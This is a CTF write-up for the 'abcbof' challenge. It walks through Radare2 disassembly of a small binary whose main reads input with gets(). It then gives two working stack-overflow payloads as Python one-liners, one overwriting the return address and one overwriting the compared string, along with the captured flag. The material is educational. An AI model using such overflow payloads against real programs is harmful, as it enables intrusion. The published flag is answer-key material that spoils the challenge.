# abcbof

## Solution

We can disassemble the binary and list all functions using a tool like Radare2.

```
[greenavocado@greenavocado-pc abcbof]$ r2 abcbof
 -- Beer in mind.
[0x00400640]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400640]> afl
0x00400640    1 42           entry0
0x00400680    4 42   -> 37   sym.deregister_tm_clones
0x004006b0    4 58   -> 55   sym.register_tm_clones
0x004006f0    3 34   -> 29   sym.__do_global_dtors_aux
0x00400720    1 7            entry.init0
0x00400870    1 2            sym.__libc_csu_fini
0x00400727    5 102          sym.get_flag
0x00400620    1 6            sym.imp.fopen
0x00400630    1 6            sym.imp.exit
0x004005b0    1 6            sym.imp.putchar
0x004005f0    1 6            sym.imp.fgetc
0x004005d0    1 6            sym.imp.fclose
0x00400874    1 9            sym._fini
0x00400800    4 101          sym.__libc_csu_init
0x00400670    1 2            sym._dl_relocate_static_pie
0x0040078d    3 100          main
0x004005e0    1 6            sym.imp.printf
0x00400610    1 6            sym.imp.gets
0x00400600    1 6            sym.imp.strcmp
0x004005c0    1 6            sym.imp.puts
0x00400588    3 23           sym._init
[0x00400640]>
```

It's worth noting the ```sym.get_flag``` function, as it's likely our "win" function.

```
0x00400727    5 102          sym.get_flag
```

We can verify this by disassembling the function.

```asm
[0x00400640]> pdf @ sym.get_flag
            ; CALL XREF from main @ 0x4007d9
┌ 102: sym.get_flag ();
│           ; var uint32_t c @ rbp-0x9
│           ; var file*stream @ rbp-0x8
│           0x00400727      55             push rbp
│           0x00400728      4889e5         mov rbp, rsp
│           0x0040072b      4883ec10       sub rsp, 0x10
│           0x0040072f      488d35520100.  lea rsi, [0x00400888]       ; "r" ; const char *mode
│           0x00400736      488d3d4d0100.  lea rdi, str.flag.txt       ; 0x40088a ; "flag.txt" ; const char *filename
│           0x0040073d      e8defeffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│           0x00400742      488945f8       mov qword [stream], rax
│           0x00400746      48837df800     cmp qword [stream], 0
│       ┌─< 0x0040074b      7515           jne 0x400762
│       │   0x0040074d      bf01000000     mov edi, 1                  ; int status
│       │   0x00400752      e8d9feffff     call sym.imp.exit           ; void exit(int status)
│       │   ; CODE XREF from sym.get_flag @ 0x400775
│      ┌──> 0x00400757      0fbe45f7       movsx eax, byte [c]
│      ╎│   0x0040075b      89c7           mov edi, eax                ; int c
│      ╎│   0x0040075d      e84efeffff     call sym.imp.putchar        ; int putchar(int c)
│      ╎│   ; CODE XREF from sym.get_flag @ 0x40074b
│      ╎└─> 0x00400762      488b45f8       mov rax, qword [stream]
│      ╎    0x00400766      4889c7         mov rdi, rax                ; FILE *stream
│      ╎    0x00400769      e882feffff     call sym.imp.fgetc          ; int fgetc(FILE *stream)
│      ╎    0x0040076e      8845f7         mov byte [c], al
│      ╎    0x00400771      807df7ff       cmp byte [c], 0xff
│      └──< 0x00400775      75e0           jne 0x400757
│           0x00400777      488b45f8       mov rax, qword [stream]
│           0x0040077b      4889c7         mov rdi, rax                ; FILE *stream
│           0x0040077e      e84dfeffff     call sym.imp.fclose         ; int fclose(FILE *stream)
│           0x00400783      bf00000000     mov edi, 0                  ; int status
└           0x00400788      e8a3feffff     call sym.imp.exit           ; void exit(int status)
[0x00400640]>
```

As you can see, it opens the flag file and reads it one character at a time using ```fgetc``` and printing it using ```putchar()```.

With this in mind, we note the address of the function, which is ```0x00400727```.
We then proceed to disassembling the ```main``` function.

```asm
[0x00400640]> pdf @ main
            ; DATA XREF from entry0 @ 0x40065d
┌ 100: int main (int argc, char **argv, char **envp);
│           ; var char *s @ rbp-0x110
│           ; var char *s2 @ rbp-0x10
│           0x0040078d      55             push rbp
│           0x0040078e      4889e5         mov rbp, rsp
│           0x00400791      4881ec100100.  sub rsp, 0x110
│           0x00400798      488d3df90000.  lea rdi, str.Hello_everyone__say_your_name: ; 0x400898 ; "Hello everyone, say your name: " ; const char *format
│           0x0040079f      b800000000     mov eax, 0
│           0x004007a4      e837feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004007a9      488d85f0feff.  lea rax, [s]
│           0x004007b0      4889c7         mov rdi, rax                ; char *s
│           0x004007b3      b800000000     mov eax, 0
│           0x004007b8      e853feffff     call sym.imp.gets           ; char *gets(char *s)
│           0x004007bd      488d45f0       lea rax, [s2]
│           0x004007c1      4889c6         mov rsi, rax                ; const char *s2
│           0x004007c4      488d3ded0000.  lea rdi, str.CyberCastors   ; 0x4008b8 ; "CyberCastors" ; const char *s1
│           0x004007cb      e830feffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│           0x004007d0      85c0           test eax, eax
│       ┌─< 0x004007d2      750a           jne 0x4007de
│       │   0x004007d4      b800000000     mov eax, 0
│       │   0x004007d9      e849ffffff     call sym.get_flag
│       │   ; CODE XREF from main @ 0x4007d2
│       └─> 0x004007de      488d3de00000.  lea rdi, str.You_lose       ; 0x4008c5 ; "You lose!" ; const char *s
│           0x004007e5      e8d6fdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x004007ea      b800000000     mov eax, 0
│           0x004007ef      c9             leave
└           0x004007f0      c3             ret
[0x00400640]>
```

Theres a call to ```strcmp()``` which compares "CyberCastors" to a string at ```rbp-0x10```.
If the compare succeeds, the function calls ```sym.get_flag```.
However, there's no function that writes to this address.

We can also see that the function calls ```gets()``` which does no bounds checks on user input, allowing us to write past buffers.
There are two methods we can use to exploit this call and print the flag.

### Overwriting the return address

We know from Radare2 that ```gets()``` will write our input to ```rbp-0x110```.
Therefore, writing 0x110+8 (280) bytes will overwrite ```rbp``` and another 8 bytes would over write the return address.
If we overwrite the return address with the address of the flag function, the program should print the flag.

```
python -c "import sys; sys.stdout.buffer.write(b'\x41' * 280 + b'\x27\x07\x40\x00\x00\x00\x00\x00')" | ./abcbof
```

Here's the output:

```
[greenavocado@greenavocado-pc abcbof]$ python -c "import sys; sys.stdout.buffer.write(b'\x41' * 280 + b'\x27\x07\x40\x00\x00\x00\x00\x00')" | ./abcbof
Hello everyone, say your name: You lose!
castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}
```

### Overwriting ```rbp-0x10```

Instead of overwriting the return address, because the string being compared is located on under the address used by ```gets()```, we can also overwrite this variable with the correct string.

The start of the string being compared is located 0x100 (256) bytes after the address used by ```gets()```.
Therefore, if we fill the first variable by writing 256 arbitrary bytes, we can write into the address of the second variable.

```
python -c "print('A' * 256 + 'CyberCastors')" | ./abcbof
```

Here's the output:

```
[greenavocado@greenavocado-pc abcbof]$ python -c "print('A' * 256 + 'CyberCastors')" | ./abcbof
Hello everyone, say your name: castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}
```

## Flag

```castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}```

